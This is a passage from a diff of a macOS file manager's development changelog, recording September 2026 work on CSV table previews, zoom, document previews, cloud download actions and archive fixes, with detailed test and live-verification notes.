+mouse-moved handling on `NSTextView`). Making the handle taller changed nothing anyone could see.
+The text view now starts under an 11-point blank band that the strip paints itself, and the handle
+lies over that band alone; confirmed by hand (docs/NOTES.md ▸ AppKit).
+
+**2026-09-15 (later still) — the stray `Info.plist` in the bundle's resources is gone.** Xcode 27
+warned that the Copy Bundle Resources phase held the target's `Info.plist`. The
+file-system-synchronized `Dirnex` group had been adding it as a resource since July, so every build
+carried the raw source plist at `Contents/Resources/Info.plist`, the installed release included. A
+membership exception in `project.pbxproj` leaves it out. With the stale copy deleted from
+DerivedData, the Debug build has no warning and no copy, the processed `Contents/Info.plist` is
+byte-identical, and the bundle differs by that one file. Restoring the old project file brought both
+back (the control). The app suite passed (1,228 tests), a Release build shows neither the warning
+nor the file, and the Debug build launched and answered AppleScript (docs/NOTES.md ▸ Release
+pipeline).
+
+**2026-09-15 (late night) — the CSV table zooms.** Asked for after sorting landed. ⌘+, ⌘− and ⌘0
+walk the ladder every preview shares (`QuickViewZoom`), a pinch zooms continuously, and a new file
+opens at 1. Two Xcode 27 steps the user took first: accepting the license, and
+`xcodebuild -downloadComponent MetalToolchain`, since SwiftTerm compiles a Metal shader and Xcode 27
+no longer ships the toolchain.
+
+- **The probe ruled out the text preview's way of zooming.** An `NSTableView` in a scroll view
+  magnified 2× drew its rows at twice the size under a column header left at 1×, so `bravo`'s title
+  sat about 170 points left of its column (a snapshot of a scratch table). So
+  `QuickViewTableView+Zoom` scales what the table is drawn with: cell and row-number fonts, row height,
+  the header's height, column widths, and the strip's fonts. A header cell's `font` is ignored when the
+  header draws (set to 22 pt, the title drew at 11), so titles are attributed strings.
+- **Five things only measuring found.**
+  - Raising a column's floor before scaling its width pushed a 65 pt column to 88, then doubled it to
+    176. Widths are now each column's base times the level, and a width somebody drags is divided back
+    into its base, so a round trip to 0.25 and back returns the table as it opened.
+  - `reloadData` after a zoom's changes left the table with no selection and posted no notification,
+    so the strip went on showing a row the table no longer marked (seen live, then traced to the
+    reload). The zoom reselects what was selected, as the table's own choice rather than the user's.
+  - The row at the top was measured from the clip view's origin, which in the browser window sits 60
+    points above the first visible row, under the title bar and the header. `firstVisibleRow` reads the
+    header's bottom edge instead, and the restore puts that row just under it.
+  - Widths that were only multiplied cut titles short (`responseCo…` at 0.8, `elap…` under its arrow
+    at 1.75), so every column is floored at its title's width at that level plus the header's own room.
+    `sizeToFit` could not supply that room: with an attributed title it leaves the arrow out (4 pt), and
+    a plain title's 21 pt still cut `elapsed` at 0.8. The room is AppKit's cell padding (4 pt) plus
+    `sortIndicatorRect`'s distance from the right edge (a 9 pt arrow, 8 pt in) plus an 8 pt gap.
+  - **The fixture's window was deallocated the moment `loaded` returned**, so every step after it,
+    across all four table suites, had been running on a surface in no window. The zoom's top-row test
+    passed that way while the app got it wrong. `QuickViewTableFixtures` now keeps its windows for the
+    life of the process, and the sorting controls were run again on it (all seven still fail).
+
+Tests: 8 new (scaling, the header over its column at 0.5, 1.5 and 3, titles fitting at four levels, a
+dragged width, the strip, the ladder and ⌘0, the top row, a new file). Controls: nine reverts each
+failed their own tests. Among them: magnifying instead of scaling (failing the header-alignment test,
+which is the probe's finding pinned), the floor raised before the width is read, the arrow room taken
+from `sizeToFit`, the selection not restored, and the top row read from the clip origin. Validation: both linters, the four CI scripts,
+3,423 core tests, and the app suite (1,228 tests in 201 suites, the live-server suites skipped, one
+pre-existing known issue). Live, on the load-test log at full window: four Zoom In steps with row 1
+still selected, the strip scaled, headers over their columns, and `elapsed` sorted at 1.75 and at 0.8
+with its whole title beside its arrow; Reset Zoom back to 1, and the file opening at 1 again after
+the pane moved away and back. **Not verified live:** a real pinch (a synthetic scroll is not a
+trackpad, docs/NOTES.md ▸ AppKit), and ⌘+ from a real key press rather than the menu item.
+
+**2026-09-15 (night) — the CSV table sorts by a click on a column header.** Asked for straight after
+the table below landed.
+
+- **`DelimitedTable.rowOrder(sortedByColumn:ascending:)` (core)** returns a permutation rather than
+  moving rows. A numeric column sorts by value, reading `1,5` and `1.5` the way the column writes them
+  (the first value with a decisive separator settles it; a column of nothing but `1,234` is read by
+  the delimiter). Any other column sorts with `localizedStandardCompare`, as Finder sorts names.
+  Blanks go last in both directions, a non-number in a numeric column after every number, and ties
+  keep file order in both directions. Release: 165 ms for 283 000 numbers, 663 ms for 173 000
+  distinct names, 56 ms for the widest text column of the 3 MB matrices, under 30 ms on the reported
+  export. 10 tests; four controls (numbers sorted as text, blanks grouped with text, ties reversed
+  with the direction, decimal commas ignored) each failed their own tests.
+  - **The first numeric fixture could not tell a value sort from a name sort.** `localizedStandardCompare`
+    already puts `9` before `10`, so sorting the column as text left the test green. The fixture now
+    holds `1.25`/`1.5` and `-2`/`-10`, where the two orders disagree.
+- **The app half (`QuickViewTableView+Sorting`).** Every column carries a sort-descriptor prototype,
+  and `#` sorts by row number, which is the way back to the file's order (a second click reverses
+  it). The sort runs off the main actor behind a generation counter, so one still running for a
+  replaced table is dropped. A row keeps its number from the file whatever the order. Where the view
+  lands depends on the selection: the row selected as the table opened is nobody's choice, so a sort
+  goes to the top of the new order and the strip shows that row; rows somebody selected stay selected
+  and in view. ⌘C copies the selected rows in the order they are shown.
+- **Removing a sorted column clears the table's sort descriptors and calls the delegate** (measured),
+  so rebuilding the columns for a new file would run a sort mid-rebuild. `resetSort` clears them
+  first, under a flag the handler ignores.
+- **Two width faults only a sort exposed, both found live on a 3 001-row load-test log.** The sort
+  arrow cut short a header sized for its bare title (`ela…`), and sorting `bytes` brought values from
+  past the width sample to the top drawn as `1374…`. A header's width is now AppKit's own, asked with
+  an arrow in it (`sizeToFit` with the indicator set), and a numeric column is wide enough for its
+  longest value in the whole file (`DelimitedTable.longestValueByteCount(inColumn:)`, read from the
+  cells' byte ranges with nothing decoded). The width test first held too few rows to reach past the
+  sample and passed with the rule removed; its fixture now puts the long value at row 1 201.
+
+Controls: seven app reverts. Six failed only their own test: rows numbered by position, a stale sort
+not dropped, `#` ignored, the opening selection kept through a sort, a chosen selection dropped, and
+⌘C copying by displayed index. The seventh, not clearing the indicators for a new file, cannot fail,
+because AppKit clears them when the column goes. The stale-sort test first waited a fixed 200 ms and
+passed with its guard removed, twice; it now awaits the sort's own task and fails on demand, drawing
+`["", "yankee"]` from the old table's order. Validation: both linters, the four CI scripts, 3 423
+core tests (11 new), and the app suite (1 220 tests, 1 139 executed with the live-server suites
+skipped, one pre-existing known issue; 8 new). Live, in the Debug build launched by path, on the
+load-test log: `elapsed` ascending (86, 87, 91…) with each row keeping its file number, descending
+(4458, 3288…), `#` back to file order, and `bytes` descending shown in full under an uncut header.
+**Not verified live:** ⌘C after a sort from a real key press, and the 663 ms sort on a real file.
+
+**2026-09-15 (evening) — a CSV or TSV file previews as a table, with the selected row in full
+underneath.** Asked for with a screenshot of `prod result.csv` in the text preview: every record one
+~350-character line, wrapped into a pane with nothing lined up. The user picked the design from two
+options (a table by default, with the strip).
+
+- **The probe settled what "column" means before any Swift.** A naive split on commas gives 13 to 18
+  fields per line of that file; parsed with quotes honoured, all 5 441 records have exactly 3 (cells
+  full of commas and doubled quotes, since the file is an export of .NET dictionaries). Python's own
+  `csv.Sniffer` failed to pick a delimiter for it for the same reason. The 17 CSVs on this Mac were the
+  corpus: 12 benchmark matrices of ~18 800 rows × 7 columns (3 MB), two 3 001-row load-test logs, one
+  pipe-separated file with no header row, one 4-row licence list. Quick Look's own CSV preview is an
+  HTML table of every row (2 MB of page for this file) with no header row.
+- **`DelimitedTable` (core)** scans the UTF-8 bytes once and keeps, per field, its byte range and how
+  to read it (12 bytes a field); a cell is decoded when it is shown. Release build: 6 ms for a 4 MB
+  file of a million short cells, 1 ms for the 3 MB matrices (Debug: 70 ms and 13 ms), with row and
+  column counts matching Python's `csv` on every corpus file. RFC 4180 plus Python's leniency: text
+  after a closing quote joins the field, CR, LF and CRLF all end a record, blank lines are no record.
+  An unclosed quote in a whole file is refused (the text is shown instead); in a file cut at the 4 MB
+  read limit the incomplete last record is dropped, unless the open quote has run past 64 KiB.
+  - **Three guesses, from a sample.** The delimiter (`,` `;` tab `|`) is the one whose most common
+    field count is shared by the most records, then the larger count, with a `.tsv` breaking ties. The
+    header row is `csv.Sniffer.has_header`'s vote (numeric columns and fixed-length columns vote on
+    whether the first row is unlike them), except that no evidence reads as a header, since most files
+    have one; that took the corpus's header-less pipe file and its 12 headed matrices both right. A
+    column is right-aligned when every sampled value reads as a number.
+  - 33 tests; six controls (quotes ignored, share ignored in detection, header fallback off, a
+    truncated record kept, spans counted in bytes, doubled quotes not undoubled) each failed only
+    their own tests.
+- **The app half.** `QuickViewPreviewView+Table` routes `.csv`, `.tsv` and `.tab` to
+  `QuickViewTableView`: an `NSTableView` with a row-number column, columns sized from their title and
+  up to 2 000 sampled values (44–320 pt), cells cut with an ellipsis that float their value on hover,
+  and ⌘C putting the selected rows on the pasteboard as tab-separated text. Under it,
+  `QuickViewRecordStrip` shows every value of the selected row under its column name, wrapped and
+  selectable, taking up to two fifths of the surface. The first row is selected as a file opens, so
+  the strip is filled before anything is clicked. More than 1 024 columns, or a file that is not a
+  table after all, shows as text. A table wider than the surface pans sideways instead of turning
+  the page; it has no zoom, so ⌘+ is disabled over it.
+- **A table opens as a table and a page as its source, and each remembers its own choice.**
+  `QuickViewDualStyleKind` (`.page` for HTML and Markdown, `.table` for CSV and TSV) names the rendered
+  style in the header ("1 Source · 2 Table") and selects the preference: `quickViewTableStyle` beside
+  the existing `quickViewRenderStyle`, so `1` on a CSV does not turn every web page into source. The
+  window's style handling moved to `BrowserWindowController+QuickViewStyle`, since
+  `BrowserWindowController+QuickView` was near the length ceiling.
+- **The source style colors the columns**, with five of `SyntaxTheme`'s already contrast-tested
+  colors, the first column in the text color. It stops after 200 000 fields: measured on the
+  million-field file, coloring everything costs 129 ms to build the attributed string and 93 ms to
+  install it on the main actor, and the cap brings that to 23 + 17 ms. The 3 MB matrices (131 000
+  fields) are colored whole.
+- **One bug only looking found.** The table opened scrolled one row down, the selected first row
+  hidden under the column header. `tableView.scroll(.zero)` pins the clip view to the document's
+  origin, but in the browser window's full-size content view the header floats over the rows and the
+  resting origin is above zero (docs/NOTES.md ▸ AppKit). The suite could not see it until its window
+  had `.fullSizeContentView` and a laid-out surface; with both, the new test failed the way the app
+  did, and `scrollRowToVisible(0)` fixed both.
+
+Controls: seven app reverts (a table opening as source; one shared style; no stand-down in the
+`show` funnel; the table left out of the surface's hit-test exemptions; a wide table not panning;
+columns not colored; the strip ignoring the selection) each failed only their own test. Validation:
+both linters, all four CI scripts (the localization check found every new key translated — one, the
+header's "Table", in all 14 languages), 3,413 core tests, and the app suite (1,212 tests, 1,130
+executed with the live-server suites skipped, one pre-existing known issue). Live, in the Debug build launched by path,
+on `prod result.csv`: the pane and full-window table with row 1 selected and the strip showing it, a
+click on row 5 moving the strip, View Source coloring the three columns and View Rendered Page going
+back, the header reading "1 Source · 2 Table", and stepping to the next file (a `.docx`) and back.
+**Not verified live:** a real trackpad pan across a wide table (a synthetic scroll is not a trackpad,
+docs/NOTES.md ▸ AppKit), ⌘C from a real key press, a CSV on a server or in an archive (both reach the
+same `show(url)` through the local copy Quick View already uses), and a semicolon or TSV file from
+another app. **Left undone:** sorting by a column, zoom on the table, and retitling View ▸ View
+Rendered Page for a table (the header says "Table"; the menu keeps its one title in every language).
+Sorting was taken up the same night (above).
+
+**2026-09-15 (later) — images zoom too.** Asked for straight after the keys below landed. The image
+was a bare `NSImageView` pinned to the surface with `scaleProportionallyDown`, which fits a large
+photo, never enlarges a small one, and has nowhere to put an image bigger than the surface.
+
+- **`QuickViewImageScrollView`** makes the image view the document of an `NSScrollView`, sized to the
+  image in points, and the zoom is the scroll view's magnification. The starting magnification is the
+  old rule as a number, the fit but never above 1, so nothing looks different until a key is pressed.
+  Sizing by `NSImage.size` keeps a Retina screenshot at its natural size: live, a 3000 px JPEG at
+  240 dpi opened at 900 pt.
+- **An image's levels are absolute scales**, unlike the other three backends'. A photograph opens at
+  an arbitrary fraction (0.39 for the 8629 × 3026 panorama), and stepping from there lands on 50 %,
+  67 %, 100 %, so actual size is a step away. ⌘0 goes back to the fit. A photo fitted below 25 % has
+  no smaller step, and the pinch floor drops to its fit so a pinch can get back there.
+- **Measured first:** a step on the panorama costs 0.1–0.4 ms and the enlarged crop draws sharp,
+  since the view redraws at the magnified scale. Resident memory was 201 MB with the old view and
+  202 MB with the new one, the same at magnification 1, 3 and 5.
+- **A zoomed image keeps the sideways two-finger scroll.** `consumesHorizontalScroll` stands the
+  page-turn swipe aside while an image or a PDF is wider than the surface, which is Preview's rule. A
+  web page and text keep the swipe as before.
+- A window resize refits an image nobody has zoomed and leaves a zoomed one alone. The next image
+  opens at its fit.
+
+Controls: four reverts (no image zoom target; the scroll view missing from the surface's hit-test
+exemptions; an unconditional refit in `layout()`; `show` not resetting the zoom). Run together they
+failed three tests, and the refit hid the missing reset, which failed its own test (two issues) only
+when run alone (docs/NOTES.md ▸ Testing). Live, in the Debug build: five View ▸ Zoom In steps on the
+panorama enlarged it about its centre and brought up scrollbars, a scroll moved it to its bottom edge,
+and Reset Zoom put it back exactly at the opening fit. A 320 px PNG stepped from 1 to 1.75 in four
+steps, and the next image opened at its own starting size. **Not verified live:** a real pinch, and
+the swipe standing aside for a zoomed image, since a synthetic scroll is not a trackpad (docs/NOTES.md
+▸ AppKit). The keys ride the same menu items as the page zoom's, verified below.
+
+**2026-09-15 — ⌘+, ⌘− and ⌘0 zoom the Quick View preview.** Asked for right after the document
+previews landed. The preview surface refuses first responder so the arrows keep driving the file list,
+so the keys had to be the window's: three registry commands (View ▸ Zoom In, Zoom Out, Reset Zoom)
+bound to ⌘+, ⌘− and ⌘0, rebindable, in the palette, and translated into the 13 other languages.
+
+- **`QuickViewZoom` (core)** is one ladder for every backend that zooms (25 % to 500 %, fine steps
+  near 100 %), always *relative to how the file opened*. A Word page opens fitted, a sheet at its own
+  size, and ⌘0 goes back to whichever it was, which is why the item is Reset Zoom rather than Safari's
+  Actual Size. A level left off the ladder by a pinch steps to the next level past it.
+- **The backends.** A web page (HTML, Markdown, a converted office page) zooms by `pageZoom`
+  multiplied onto its fit width, so ⌘+ on a Word page fitted at 177 % goes to 195 % rather than 110 %.
+  A PDF zooms relative to its fitted or 100 % scale and is handed back to `autoScales` at 1. Text uses
+  the scroll view's magnification, which a pinch also moves, stepped about the visible centre. A new
+  file starts back at its opening size in all three. A photograph (until the entry above), Quick
+  Look's own view and the remote placeholder card have no zoom, and the items are disabled there.
+- **⌘+ needed a hidden ⌘= alias.** Measured with `NSMenu.performKeyEquivalent`: an item bound to `+`
+  does not fire for a plain ⌘=, which is how ⌘+ is typed on a US keyboard (docs/NOTES.md ▸ AppKit).
+  `MainMenuBuilder` adds the alias only while Zoom In is on ⌘+ and nothing else claims ⌘=.
+
+Controls: four reverts (no alias; the zoom replacing the fit instead of multiplying it; no reset on a
+new page; a PDF zoomed from 100 % instead of from its fit) each failed only their own tests, five in
+all. Live, in the Debug build: View ▸ Zoom In three times enlarged the Word page and Reset Zoom
+returned it to its fit. Key presses of ⌘= (twice), ⌘− and ⌘0 did the same on the Word page, and ⌘=
+zoomed the Pages PDF. The screen tool sends `=` and `−` as keypad keys (logged), which carry the same
+characters as the main-row keys and match the same items. **Not verified with a real key press:** a
+main-row ⇧⌘= and keypad +. The tool cannot type `+` (docs/NOTES.md ▸ Live verification); both are
+covered by the `NSMenu` probe and AppKit's documented handling of Shift.
+
+**2026-09-14 — Quick View shows Word, Excel, PowerPoint, Pages, Numbers and Keynote files in-process,
+with every page, zoom and selection, plus RTF and OpenDocument text.** Reported with two screenshots:
+a `.docx` showed one page whose page arrows could not be clicked, an `.xlsx` was a thumbnail too small
+to read, and nothing in either could be zoomed or selected. None of it was fixable in the view those
+files reached. `QLPreviewView` renders out of process, and the surface has to swallow the mouse for it
+(docs/NOTES.md ▸ AppKit), which is why the arrows were dead. The route taken is the generator's
+*output* instead of its view.
+
+- **The probe decided the design.** `qlmanage -p -o <dir>` writes what Quick Look's generators produce:
+  real HTML for every Office format (tables, images as files, a script-driven tab strip for a
+  workbook's sheets) and one vector PDF per page or sheet for iWork, with real text. That took
+  50–740 ms across the formats. The same data is reachable in-process only through header-less
+  `QLPreview*` functions, which are private. Our own OOXML parsers would have covered none of `.xls`,
+  `.doc`, `.ppt` or iWork, and `NSAttributedString` drops a `.docx`'s images (1 MB came back as 744
+  characters). docs/NOTES.md ▸ *qlmanage* has the measurements.
+- **`QuickLookPreviewBundle` (core)** reads a bundle: whether to show the page (with the generator's
+  own JavaScript answer, its `CenterContent`, and a fit width unless `ShouldNotScale`) or to merge PDFs,
+  in reading order. For Numbers that order comes from the tab strip, not the iframe, which names
+  whichever sheet was selected. Only plain file names inside the bundle are returned. The routed
+  types are read from the two generators' own `Info.plist`, so a later macOS without a generator
+  falls back to Quick Look rather than to a tool that answers nothing. 21 tests over captured
+  bundles; four controls each failed only their own test.
+- **The app half.** `QuickLookDocumentConverter` spawns the tool with both streams to the null device
+  (its exit status is 0 even when it produced nothing) and caches the last eight conversions keyed by
+  `ArchiveIdentity`, purging its temp root at launch. `QuickViewPreviewView+Document` shows Office
+  pages in the existing network-blocked web view. There the generator's scripts may run, sheet
+  iframes may load from inside the bundle, and the page zooms to the surface width (0.5–2×) unless
+  it is a sheet. iWork pages go to the existing PDF view, fitted unless the bundle says it is a
+  sheet. `QuickViewPreviewView+RichText` reads RTF, RTFD and `.odt` off the main actor (about 41 ms
+  per megabyte, capped at 32 MB) into the text view with dark-appearance colour mapping. The text
+  view also gained pinch zoom. The PDF backend moved to its own file, since `QuickViewPreviewView`
+  sat near `file_length`.
+- **It crashed once, live, and the crash is the finding worth keeping.** The first screenshot of a
+  Pages preview killed the app. The screenshot tool's element summary walked the PDF view's
+  accessibility tree, and pages inserted into another `PDFDocument` had outlived the documents they
+  came from: `CGPDFPageCopyRootTaggedNode` aborted on a recursively locked `os_unfair_lock`. A harness
+  reproduced it 3 of 3, and 0 of 3 with the parts retained. `MergedPDFDocument` owns its parts, and a
+  test walks the tree; reverted, that test kills the host with the same abort. VoiceOver is the same
+  kind of client, so this was a real user's crash (docs/NOTES.md ▸ AppKit).
+- **Two more things only looking found.** `PDFView` opened the document below the top of page one
+  (y ≈ 675 of 842, for plain PDFs too; fixed in the shared funnel, with a test whose control fails on
+  the old position). And a Numbers sheet fitted into a pane was half size until `ShouldNotScale` was
+  honoured on the PDF route as well.
+
+Validation: 3,372 core tests; the app suite (1,184 tests, 1,103 executed with the live-server suites skipped, one pre-existing known issue) with the new
+suite serialized over the converter's shared temp root; both linters; all four CI scripts. Live, in
+the Debug build launched by path, pane and full-window: the `.docx` (fitted, centred, every image, a
+selection drag), a one-sheet `.xlsx` at full size, a two-sheet `.xls` whose second tab switched the
+sheet, a `.pptx` fitted to the pane, a 12-page `.pages` (opened at the top, selection highlighted,
+survived the accessibility walk), a `.numbers` sheet at 100 % with scrollbars, a `.key`, an `.rtf`
+and a styled `.odt` (bold, italic, red, Cyrillic, legible in dark mode), and a corrupt `.docx`
+falling back to Quick Look's icon with no conversion directory left behind. **Not verified live:**
+pinch zoom itself (a synthetic scroll is not a trackpad, docs/NOTES.md ▸ AppKit), rapid cursor
+stepping through many documents, an archive member or a server file (both reach the same
+`show(url)` through the local copy Quick View already uses), and the 4 096-row cap, which is
+measured in the generator but has no marker on screen.
+
+**2026-09-12 (later) — Download Now, Remove Download and Show in Finder, on every cloud provider.**
+Asked as a question: each cloud adds its own actions to Finder's menu, so can Dirnex have them too?
+Mostly no, and the probe is what says why. Copy Dropbox link, View on Box.com, Version History and
+the rest are declared in each provider's File Provider extension (Dropbox 25, Box 26, Google Drive
+22, OneDrive 14), shown when a predicate over metadata only `fileproviderd` can read matches, and
+run through the private `FPItemManager`. The two actions every provider shares turned out to be
+public `FileManager` calls that work on **third-party** domains, which three NOTES entries had read
+as impossible — they had tried the provider's `NSFileProviderManager` route instead (docs/NOTES.md
+▸ *Download Now and Remove Download on any provider*). So the pass ships those two, plus Show in
+Finder as the route to everything else.
+
+- **`CloudLocalCopy` (core)** holds the decisions. `CloudLocalCopyAction` says what a folder means:
+  Download Now **walks** it and asks for each placeholder, because the system call on a folder
+  answers success and downloads nothing (measured: seventeen placeholders still placeholders thirty
+  seconds later), while Remove Download on a folder is **one** request, because eviction recurses.
+  `CloudLocalCopyTarget` qualifies a row from facts the pane already holds, never from a resource read
+  a menu validator would wait on: a placeholder, a path under `~/Library/CloudStorage` or
+  `~/Library/Mobile Documents`, or something the pane already knows (a sync badge, or the directory
+  read as a cloud directory off the main thread). A symlink never qualifies, since mirror-mode `My
+  Drive` is one. `CloudLocalCopyRefusal` reads the whole error chain, because the outer Cocoa 512
+  wraps two different refusals; not-a-cloud-item is **counted** rather than reported, since the path
+  rule over-approximates on purpose.
+- **The app half** is `PanelViewController+CloudLocalCopy`. File ▸ Show in Finder sits with Get Info,
+  and the cloud pair gets its own group below it. The right-click adds all three beside Quick View,
+  and *leaves them out* rather than graying them where they cannot mean anything: no Show in Finder
+  for a server's file, no cloud pair on an ordinary file or in a Trash listing. Both calls run through
+  `BlockingWork`, then the pane refreshes; the status line counts what was asked for, and a refusal
+  alert names the item with its reason, listing up to six before counting the rest. There is no
+  confirmation for either: the provider refuses to evict anything it has not uploaded (measured), and
+  Finder asks for neither. `PanelTab.cloudDirectoryReading` is read ahead of the badge-visibility
+  gate in `updateSyncStatus`, so switching the badges off does not quietly switch Remove Download
+  off in iCloud's Desktop and Documents, the one place only that read can say "cloud".
+- The three commands went into `CommandCatalogLocation.swift`, since `CommandCatalog` sits at
+  SwiftLint's `type_body_length`; the palette finds them by each provider's own phrasing ("make
+  online-only", "free up space", "dropbox").
+
+Controls: six on the core rules each failed exactly their own tests, and four on the app rules were
+run against the reach suite, which went back to 10/10 green with the file restored. Validation:
+3,279 core tests, 1,128 app (1,081 executed, the live-server suites skipped: nothing remote changed),
+both linters, all three CI scripts, and live runs in the Debug build. Remove Download and then
+Download Now on a single cloud file went to `SF_DATALESS` and back in under 4 s, and on a 17-file
+folder both ways in 1.5 s. On a Dropbox JPG held open by another process, Remove Download raised
+*"Couldn’t remove the download of “DSCF8562.JPG”"* / *"It’s open in an app. Close it there and try
+again."* and left the file downloaded (`st_flags` `0x40`, 6144 blocks). Show in Finder, driven through
+`run operation "file.showInFinder"`, opened Dropbox ▸ Home Team Folder with that file selected.
+**Not verified live, and pinned only by tests:** the right-click menu itself (a context menu cannot
+be opened headlessly); a directory *read* as cloud, i.e. iCloud's Desktop and Documents; and the
+multi-refusal list.
+
+**2026-09-12 — a Download the user already agreed to widens the preview for the session, and ⌘D
+presses it.** Reported with two screenshots: Quick View over an S3 bucket of 23–36 MB camera RAW
+files, one of them downloaded after agreeing to it, and the next one back on the placeholder card
+with a Download button only the mouse could reach — the surface refuses first responder so the
+arrows keep driving the list. The limit behind the card is Settings ▸ Panels' 10 MB, a standing
+statement about every server; the click was a statement about *these* files, and nothing kept it.
+The user proposed remembering the last size plus 20 %. What shipped is that idea with three changes,
+argued from their own folder.
+
+- **`RemotePreviewAllowance` (core)** keeps, per connection and in memory only, **twice** the largest
+  file agreed to beyond the Settings limit. Twice rather than +20 %: after the 23.1 MB CR2, +20 %
+  gives 27.7 MB and leaves the 28.5 MB NEF and the 36.1 MB RW2 each needing a click, where 46.2 MB
+  covers the folder — and headroom is cheap, because the automatic fetch's settle delay and
+  abandonment already bound what it can spend. An agreement the limit already covered teaches
+  nothing (a ⌃Q on a 9 MB file must not double a 10 MB limit), a limit of 0 ignores all of it, and a
+  change to the limit clears everything. **Stop** on a download larger than the limit forgets that
+  connection's allowance outright rather than lowering it below the stopped file, which would leave
+  every 1.9 GB video downloading after one mistaken click on a 2 GB one.
+- **Only the two preview rows of `RemoteFetchPolicy` read it**, through a parameter of its own rather
+  than folded into `previewLimit`: every other row is expressed against that limit, so folding it in
+  would let one click on a 300 MB photograph stop ⌥F5 and checksums confirming up to 600 MB. What
+  counts as agreeing is decided by where it is recorded — `openRemotePreview`'s `onStart`, i.e. the
+  card, ⌘D and the ⌘Y / ⌃Q confirmation answered yes. ⏎, F4 and a drag out never reach it, and
+  leaving a row is browsing rather than a refusal, so it withdraws nothing.
+- **View ▸ Download Preview (⌘D)** runs the card's own action (`previewActions(for:)`), is enabled by
+  the one state the button's visibility reads (`RemotePreviewPlaceholder.State.offersDownload`), and
+  the card draws the live binding on its button. ⌘D rather than ⌃D, because a menu key equivalent is
+  searched before the field editor and ⌃D would take delete-forward out of every text field.
+- **The live run found the one bug the suite could not see.** The card drew a bare "Download":
+  `previewActions` never passed the shortcut, `RemotePreviewActions.downloadShortcut` defaulted to
+  `nil`, and the card's test sets the card's shortcut directly. The field is now required, so every
+  construction site has to say what it means — docs/NOTES.md's "remove the default" rule, met from
+  the display side.
+
+`BrowserWindowController+QuickView` was at 498 of 500 lines, so the fetch-limit observer moved with
+the new command into `BrowserWindowController+RemotePreview`, and the pane's half into
+`PanelViewController+RemotePreviewAllowance`. Controls, in three builds so none masked another:
+dropping the recorded agreement, the prompt's allowance, the cursor-following decision's allowance,
+the card Stop's record, the transfer-ended Stop's record, `offersDownload` and the title's shortcut
+each failed exactly its own tests and left the rest green. Validation: 3,265 core tests, 1,118 app
+(1,061 executed), both linters, all three CI scripts, and a live run with the Debug build on the
+reported bucket — ⌘D on MG_3010.CR2 (23.1 MB) downloaded it; MG_3186.CR2 (22.9 MB),
+P1011960.RW2 (36.1 MB) and DSC_0004.NEF (28.5 MB) then started on their own; Stop on P1060804.dng
+left "Download stopped.", after which DSC_0697-Панорама.jpg (14.5 MB) was back on the card. **Not
+verified live, and pinned by no test:** a change to the Settings limit clearing the allowance — one
+line in the observer, left unexercised because changing the limit writes the developer's own
+preference domain.
+
+**2026-09-10 (last of the day) — an archive rewrite keeps every member's modification date.**
+Found by checking the archive after the CP866 rename below rather than by any test: both
+members had moved from `09.09.2026 23:40` to `10.09.2026 16:55`, including the one nothing had
+touched. The rewrite is extract → edit → repack and the *extract* half has two engines —
+`bsdtar -x`, which restores times by default (measured, a 2024 stamp comes back to the second), and
+`EncryptedArchiveReader`, which writes each file itself and read `archive_entry_mtime` only to build
+a listing. So the staged tree was stamped "now" and the repack baked it in, on every rewrite of an
+**encrypted** archive or one with a **declared code page** — F8, F2 and paste alike, with the plain
+route unaffected. That asymmetry is also why nothing caught it: every rewrite fixture in the suite
+goes through `bsdtar`. Fixed at placement with `futimens`/`utimensat`; directories are collected and
+stamped **after** the walk, because creating an entry inside a directory moves that directory's own
+mtime (measured, along with the fact that stamping a child leaves its parent alone — so the deferred
+pass needs no ordering) and `UTIME_OMIT` leaves the access time alone. `EncryptedArchiveReader` hit
+the `type_body_length` ceiling on the way, so its own `// MARK: - Extraction` section became
+`EncryptedArchiveReader+Extracting.swift` — split by concept, which is what the three MARKs were
+already saying. Controls, both halves: neutered, the core suite fails on exactly the two new tests
+(all five fixture entries plus the directory, reading *now* against the archive's own stamp) and the
+app suite fails **only** the encrypted rename while the `bsdtar` twin beside it stays green, which
+is what says the two tests measure the two routes. Validation: 3,252 core tests, 1,110 app, both
+linters, all three CI scripts, and a live re-run — the same CP866 rename now leaves both members at
+`09.09.2026 23:40`, the renamed one still UTF-8-flagged, and ⌘Z restores the container byte for
+byte.
+
+**2026-09-10 (fourth) — the chooser puts the cursor back on the member it was asked about, and
+F2 re-opens its field there by itself.** Reported: F2 raises the chooser and answering it leaves no
+text box — correct as far as it went, since the pass below deliberately returns rather than open a
+field over a name that has not decoded, and it left the gesture half-finished. Two halves. The
+*cursor*: a declaration re-decodes **every** name, so the pane's anchor is a `VFSPath` that no longer
+exists and `Panel.restoreCursor` falls back to `min(cursor, count - 1)` — which on the reporter's
+CP866 archive is a different file, because the code page decides the collation and the ordinary
+default (CP437) sorts the same member elsewhere. `ArchiveMemberAnchor` (core) finds the row again by
+kind, byte size and parent, and only when exactly one candidate fits. It deliberately **does not
+compare the modification date**, which is the measurement worth keeping: the two listing engines'
+stamps are not comparable — `bsdtar -tvf`'s date column carries no seconds where libarchive reports
+the real mtime — so a re-decode that switches engines moves a field nothing touched. The *resume*:
+`askForNameEncoding` calls back with the member it landed on, so F2 re-enters `beginRename`, by which
+time the archive is declared and this very guard answers `false`. Also answered, since the report
+asked it outright: the damage is **name-only**. Measured on the fixture — the stored name is
+`8f a0 ad ae e0 a0 ac a0 2e 74 78 74` with the UTF-8 flag clear (CP866 `Панорама.txt`), while that
+member's *contents* are valid UTF-8 (`53 45 43 52 45 54 …`, `e2 80 94` for the em dash). An archive
+never transcodes what it stores, so nothing but the central directory is ever at stake, and a rewrite
+under the declared page writes `'./Панорама.txt' utf8flag=True` — repaired permanently, readable
+everywhere. Controls: the re-anchor block removed fails `theChooserKeepsItsRow` with
+`landed.byteSize → 5` against `17`, the reporter's own symptom; `ignoresTheModificationDate` pins the
+omission, since a date-comparing anchor passes every *other* test in the suite. Validation: 1,108 app
+tests, 3,250 core, both linters, and a live run — F2 on the unreadable row of `legacy-plain.zip`
+raises the chooser with no field, and answering it re-opens the rename box on that same row with the
+name selected, the fixture byte-identical afterwards (a declaration rewrites nothing). A
+background-driven run cannot open a popup button, so only CP437 is reachable there: the live half
+demonstrates the **resume** and the reorder stays covered headlessly.
+
+**2026-09-10 (third) — F2 asks for the code page before it opens the field**, not
+after the rename is committed. Reported: answer the chooser and the rename does not happen — correct
+by the "a refusal is never retried" rule, and no consolation to somebody who has just lost the name
+they typed. Every other route into the chooser is a refusal whose whole input is a row somebody
+pointed at, costing one keystroke to make again; F2's input is *authored*, and the captured target is
+spelled with the undecoded name so it cannot be replayed once the code page lands. It is also the
